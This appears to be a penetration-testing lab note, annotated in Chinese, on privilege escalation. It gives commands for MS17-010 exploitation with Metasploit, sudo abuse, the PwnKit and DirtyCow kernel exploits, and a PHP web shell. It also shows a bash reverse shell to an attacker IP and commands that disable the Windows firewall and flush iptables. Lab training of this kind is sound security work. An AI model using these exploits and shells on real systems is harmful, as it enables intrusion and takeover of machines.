Penetration Test - Privilege Escalation
===

🔙 [MENU README](../README.md)


# iLab
Module 6 
```
Parrot Security       192.168.0.18    172.19.19.18
Windows Server 2019   192.168.0.20
Windows Server 2008   192.168.0.7, 21
SSH Server            192.168.0.70
WordPress             192.168.0.24
```

---

> PayloadsAllTheThings
> https://github.com/swisskyrepo/PayloadsAllTheThings

# MS17-010
Detect and Scan
```bash

nmap 192.168.0.7 -sVC -n -Pn
# 發現port 445

nmap 192.168.0.7 -sVC -n -Pn -p445 --script smb-protocols.nse
# 對 port 445深度探測，發現版本smb v1
# SMBv1 有 MS17_010 漏洞

nmap 192.168.0.7 -sVC -n -Pn -p445 --script smb-vuln-ms17-010.nse
# 針對 MS17_010 漏洞 進行探測


# Nmap中的Script : ls /usr/share/nmap/scripts/
```
Metasploit
```bash
msfconsole -q # without banner

# set paylaod
msf > search ms17_010
msf > use 2
msf > show options
msf > set rhosts 192.168.0.7
msf > check
msf > exploit  # Attack Success when see "WIN"


# WIN
getuid  # Server username: NT AUTHORITY\SYSTEM
shell
whoami
```

# Sudo
```bash
# su    切換至目標帳號/需要目標帳號密碼
# sudo  預授權
#        是否需要驗證(自己的密碼)
#        路徑、檔名、參數  ex. /bin/target -i


sudo -l
# (ALL:ALL) ALL

sudo -i
# 直接提權
```
```bash
# 去百科全書查找
GTFOBins
```

# PwnKit
低版本Kernel的通殺提權
> https://github.com/ly4k/PwnKit
```bash
# Version Check
uname -a

wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit32

# Pass1
sudo python3 -m http.server 80
wget 192.168.0.18/PwnKit
# Pass2
scp PwnKit aleksander@192.168.0.70:~/. #dolphin

# 一般kernel exploit希望執行的路徑有寫入權限
# /tmp是不錯的選擇
chmod +x PwnKit && ./PwnKit
```

# DirtyCow
```bash
# 更低版本的Linux : Linux Kernel 2.6.22 < 3.9
# https://www.exploit-db.com/exploits/40847
searchsploit -m 40847

# Pass1
sudo python3 -m http.server 80
wget 192.168.0.18/40847.cpp
# Pass2
scp 40847.cpp aleksander@192.168.0.70:~/.

# how to use : head 40847.cpp
g++ -Wall -pedantic -02 -std=c++11 -pthread -o dcow 40847.cpp -lutil
./dcow -s
```


# Egress Busting (Remote Control)
Ubuntu(Wordpress)一句話木馬
```bash
# shell.php
<?php system($_GET['cmd']); ?>

curl 192.168.0.24/shell.php?cmd=id
curl -G 192.168.0.24/shell.php --data-urlencode "cmd=id"
# -G : get

# Get Remote Control
nc -vnlp 8888
curl -G 192.168.0.24/shell.php --data-urlencode "cmd=bash -c 'bash -i > /dev/tcp/192.168.0.18/8888 0<&1 2>&1'"
```
Reverse Shell的形成
```bash
# shell
BASH 、 DASH 、ZSH
# shell I/O fild descripter
fd 0  stdin
fd 1  stdout
fd 2  stderr

pidof bash
ls - l /proc/98793/fd
# 觀察:
# 當process運行時會產生一PID，相對的會映射fd到目錄

# ==============================================

# console
tty : 只存在於本機
pty : 遠端模擬tty
# console I/O
stdin  0
stdout 1
stderr 2

python2
python2 --version 2> /dev/null
# 觀察 : 
# python2其實是把版號是把輸出放在stderr
```
```bash
bash -i > /dev/tcp/192.168.0.18/8888 0<&1 2>&1

bash -i : 互動
>       : 1>    將這台機器的BASH的stdout到socket
0<&1    : 0<fd1 將這台機器的BASH的stdin來源設定為stdout
          但前面已經設定stdout來自socket
2>&1    : 將這台機器的BASH的stderr導向BASH的stdout
          但前面已經設定stdout來自socket

至此所有目標機器上的輸出入都跟socket對接起來
```
Test 可以用來反彈的port
```bash
# Attacker
sudo tcpdump -ni eth0 tcp[13]==2

# Victim(with nc)
nc -nz 192.168.0.18 1-10

# Victim(without nc)
echo > /dev/tcp/192.168.0.18/100
for port in {200..210};do (echo > /dev/tcp/192.168.0.18/$port) 2> /dev/null;done
```

---


# Persistent
Windows
```bash
# Display Firewall Setting
netsh advf show allprofiles

# 禁用防火牆
netsh firewall set opmode disable # old version
netsh advf set allprofiles state off # new version
```
Linux
```bash
# Display iptables Setting
sudo iptables -S

sudo iptables -P INPUT ACCEPT  #允許所有INBOUND
sudo iptables -P OUTPUT ACCEPT #允許所有OUTBOUND

sudo iptables -F #flush所以有防火牆規則
# 不建議，因為很多靶機其實預設是全擋
```